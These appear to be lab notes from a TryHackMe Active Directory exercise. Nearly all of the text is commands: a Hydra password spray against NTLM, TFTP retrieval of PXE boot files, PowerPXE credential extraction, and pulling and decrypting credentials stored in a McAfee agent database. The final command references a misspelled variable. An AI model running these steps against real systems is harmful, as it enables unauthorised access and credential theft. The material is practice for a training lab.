# Using Hydra to Brute-force NTLM
```
hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'
```
# Pretend You're a PXE Client
```
tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET "\Tmp\x64{BFA810B9-DF7D-401C-B5B6-2F4D37258344}.bcd" conf.bcd
```
# Analyze the boot image
```
Import-Module .\powerpxe\PowerPXE.ps1
$bcdfile = "conf.bcd"
Get-WimFile -bcdFile $bcdfile

$wimfile = '\Boot\x64\Images\LiteTouchPE_x64.wim'
$mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress
tftp -i $mdtserver GEt "$wimfile" pxeboot.wim

Get-FindCredentials -WimFile .\pxeboot.wim
```

# Secure Copy the File
```
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db
```
# SQLite
```
sqlite3 ./ma.db

.tables

.schema AGENT_REPOSITORIES

SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES;

.quit
```

# Sqlitebrowser
```
sqlitebrowser ./ma.db &
```
# Reverse the encrypted password
```
encrypted_pw='jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
python2 ./mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $encryped_pw
```

